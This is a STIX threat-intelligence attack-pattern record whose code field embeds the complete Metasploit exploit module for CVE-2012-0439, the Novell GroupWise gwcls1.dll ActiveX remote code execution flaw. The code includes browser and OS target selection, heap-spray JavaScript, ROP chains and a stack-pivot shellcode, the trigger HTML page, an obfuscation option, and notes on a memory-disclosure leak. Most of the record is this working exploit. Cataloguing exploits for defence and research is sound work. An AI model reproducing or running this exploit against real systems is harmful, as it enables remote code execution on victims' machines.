{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59964376-7192-401e-ac1c-ee598afcfabb",
    "created": "2024-08-14T16:45:03.809081Z",
    "modified": "2024-08-14T16:45:03.809085Z",
    "name": "\"Novell GroupWise Client gwcls1.dll ActiveX Remote Code Execution\"",
    "description": " This module exploits a vulnerability in the Novell GroupWise Client gwcls1.dll ActiveX. Several methods in the GWCalServer control use user provided data as a pointer, which allows to read arbitrary memory and execute arbitrary code. This module has been tested successfully with GroupWise Client 2012 on IE6 - IE9. The JRE6 needs to be installed to achieve ASLR bypass.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/novell_groupwise_gwcls1_actvx.rb",
            "external_id": "novell_groupwise_gwcls1_actvx.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0439"
        },
        {
            "source_name": "reference",
            "url": "http://www.novell.com/support/kb/doc.php?id=7011688"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => NormalRanking,\n  #  :classid    => \"{601D7813-408F-11D1-98D7-444553540000}\",\n  #  :method     => \"SetEngine\"\n  #})\n\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Novell GroupWise Client gwcls1.dll ActiveX Remote Code Execution\",\n      'Description'    => %q{\n          This module exploits a vulnerability in the Novell GroupWise Client gwcls1.dll\n        ActiveX. Several methods in the GWCalServer control use user provided data as\n        a pointer, which allows to read arbitrary memory and execute arbitrary code. This\n        module has been tested successfully with GroupWise Client 2012 on IE6 - IE9. The\n        JRE6 needs to be installed to achieve ASLR bypass.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez'                  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-0439' ],\n          [ 'OSVDB', '89700' ],\n          [ 'BID' , '57658' ],\n          [ 'ZDI', '13-008' ],\n          [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7011688' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'    => \"\\x00\",\n          'Space'       => 1040,\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # gwcls1.dll 12.0.0.8586\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],\n          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x3e3' } ],\n          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => '0x3e3' } ],\n          [ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x3e3' } ],\n          [ 'IE 9 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x3ed' } ]#'0x5fe' } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-01-30',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n    case my_target\n    when targets[7]\n      # IE 9 on Windows 7\n      js = %Q|\n      function randomblock(blocksize)\n      {\n        var theblock = \"\";\n        for (var i = 0; i < blocksize; i++)\n        {\n          theblock += Math.floor(Math.random()*90)+10;\n        }\n        return theblock;\n      }\n\n      function tounescape(block)\n      {\n        var blocklen = block.length;\n        var unescapestr = \"\";\n        for (var i = 0; i < blocklen-1; i=i+4)\n        {\n          unescapestr += \"%u\" + block.substring(i,i+4);\n        }\n        return unescapestr;\n      }\n\n      var heap_obj = new heapLib.ie(0x10000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_random_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset_length = #{my_target['Offset']};\n      for (var i=0; i < 0x1000; i++) {\n        var padding = unescape(tounescape(randomblock(0x1000)));\n        while (padding.length < 0x1000) padding+= padding;\n        var junk_offset = padding.substring(0, offset_length);\n        var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);\n        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n        heap_obj.alloc(sprayblock);\n      }\n      |\n\n    else\n      # For IE 6, 7, 8\n      js = %Q|\n      var heap_obj = new heapLib.ie(0x20000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{my_target['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n      |\n\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def stack_pivot\n    pivot = \"\\x64\\xa1\\x18\\x00\\x00\\x00\"  # mov eax, fs:[0x18 # get teb\n    pivot << \"\\x83\\xC0\\x08\"             # add eax, byte 8 # get pointer to stacklimit\n    pivot << \"\\x8b\\x20\"                 # mov esp, [eax] # put esp at stacklimit\n    pivot << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp, -2000 # plus a little offset\n    return pivot\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    return [0x0c0c0c10 - 0x426].pack(\"V\") + [0x0c0c0c14].pack(\"V\") + code if t['Rop'].nil?\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n      when :msvcrt\n        print_status(\"Using msvcrt ROP\")\n        rop_payload = generate_rop_payload('msvcrt', '', 'target'=>'xp') # Mapped at 0x0c0c07ea\n        jmp_shell = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $+#{0x0c0c0c14 - 0x0c0c07ea - rop_payload.length}\").encode_string\n        rop_payload << jmp_shell\n        rop_payload << rand_text_alpha(0x0c0c0c0c - 0x0c0c07ea- rop_payload.length)\n        rop_payload << [0x0c0c0c10 - 0x426].pack(\"V\")  # Mapped at 0x0c0c0c0c # 0x426 => vtable offset\n        rop_payload << [0x77c15ed5].pack(\"V\")          # Mapped at 0x0c0c0c10 # xchg eax, esp # ret\n        rop_payload << stack_pivot\n        rop_payload << code\n      else\n        print_status(\"Using JRE ROP\")\n        rop_payload = generate_rop_payload('java', '') # Mapped at 0x0c0c07ea\n        jmp_shell = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $+#{0x0c0c0c14 - 0x0c0c07ea - rop_payload.length}\").encode_string\n        rop_payload << jmp_shell\n        rop_payload << rand_text_alpha(0x0c0c0c0c - 0x0c0c07ea- rop_payload.length)\n        rop_payload << [0x0c0c0c10 - 0x426].pack(\"V\")  # Mapped at 0x0c0c0c0c # 0x426 => vtable offset\n        rop_payload << [0x7C348B05].pack(\"V\")          # Mapped at 0x0c0c0c10 # xchg eax, esp # ret\n        rop_payload << stack_pivot\n        rop_payload << code\n    end\n\n    return rop_payload\n  end\n\n\n  def load_exploit_html(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n\n    trigger = \"target.GetNXPItem(\\\"22/10/2013\\\", 1, 1);\" * 200\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:601D7813-408F-11D1-98D7-444553540000' id ='target'>\n    </object>\n    <script>\n      target.SetEngine(0x0c0c0c0c-0x20);\n      setInterval(function(){#{trigger}},1000);\n    </script>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n\n\n=begin\n\n* Remote Code Exec\n\n(240.8d4): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\PROGRA~1\\Novell\\GROUPW~1\\gwenv1.dll -\neax=00000000 ebx=0c0c0bec ecx=030c2998 edx=030c2998 esi=0c0c0bec edi=0013df58\neip=10335e2d esp=0013de04 ebp=0013de8c iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202\ngwenv1!NgwOFErrorEnabledVector<NgwOFAttribute>::SetParent+0x326b9d:\n10335e2d 8a8e4f040000    mov     cl,byte ptr [esi+44Fh]     ds:0023:0c0c103b=??\n\n\n.text:103BDDEC                 mov     eax, [ebp+var_4] // var_4 => Engine + 0x20\n.text:103BDDEF                 test    esi, esi\n.text:103BDDF1                 jnz     short loc_103BDE17\n.text:103BDDF3                 cmp     [eax+426h], esi\n.text:103BDDF9                 jz      short loc_103BDE17 // Check function pointer against nil?\n.text:103BDDFB                 mov     ecx, [ebp+arg_8]\n.text:103BDDFE                 mov     edx, [ebp+arg_4]\n.text:103BDE01                 push    ecx\n.text:103BDE02                 mov     ecx, [eax+42Ah]  // Carefully crafted object allows to control it\n.text:103BDE08                 push    edx\n.text:103BDE09                 mov     edx, [eax+426h] // Carefully crafted object allows to control it\n.text:103BDE0F                 push    ecx\n.text:103BDE10                 call    edx  // Win!\n\n* Info Leak\n\n// Memory disclosure => 4 bytes from an arbitrary address\n// Unstable when info leaking and triggering rce path...\ntarget.SetEngine(0x7ffe0300-0x45c); // Disclosing ntdll\nvar leak = target.GetMiscAccess();\nalert(leak);\n\n=end\n",
    "x_mitre_disclosure_date": "2013-01-30",
    "x_mitre_platforms": [
        "win'"
    ]
}